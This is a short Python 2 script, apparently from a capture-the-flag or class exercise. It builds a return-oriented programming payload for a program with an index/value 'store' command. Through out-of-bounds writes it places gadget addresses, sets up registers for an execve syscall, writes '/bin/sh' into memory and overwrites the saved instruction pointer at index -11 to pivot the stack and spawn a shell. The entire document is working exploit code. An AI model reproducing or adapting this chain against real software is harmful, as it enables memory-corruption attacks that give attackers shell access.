
def write(index, value):
    string = "" 
    #Initiate the store sequence
    string += "store\n"
    string += str(int(value,16)) + "\n" # Converts hex to int
    string += str(index) + "\n"
    return string 

total_payload = ""
location = 13

# Edx gadget to write to edx 
total_payload += write(location, "0x080695a5") 
location +=1 # 14
total_payload += write(location, "0x0") 
location += 2 # 16

# Ebx gadget to write to eax
total_payload += write(location,"0x80bf5dd")
location += 1 # 17 
total_payload += write(location, "0x0b")
location += 2 # 19

# Puts ebx into eax
# This eats up positions 20,21,22,23. Then, we need to use 20 for the ret
total_payload += write(location,"0x08059811")
location += 3 # 22

# Get to the ecx gadget
total_payload += write(location, "0x8048470") # NOP
location +=1 # 23
total_payload += write(location, "0x080e6255") # Jump to ecx gadget
location += 2 # 25


# Ebx gadget
# Need to write the string /bin/sh for the ebx gadget. Once this is written, then we can put a stack address (like a pointer) into ebx
total_payload += write(location, "0x80bf5dd") # jump to ebx gadget
location += 1 # 26
total_payload += write(location, "0xbffff6cc") #stack location of the string
location += 2

# sys call to finish it off!
total_payload += write(location, "0x08048eaa")

# Add the string /bin/sh to the payload
total_payload += write(97,"0x6e69622f") 
total_payload += write(98,"0x0068732f")




# Enter into the edx gadget! 
#total_payload += write(location + 7, "0x0806f3a2")
#total_payload += write(location + 10, "0x0") 


# This is to overwrite the EIP to redirect the execution to the stack pivot
total_payload += write(-11, "0x08095d9f")

print total_payload
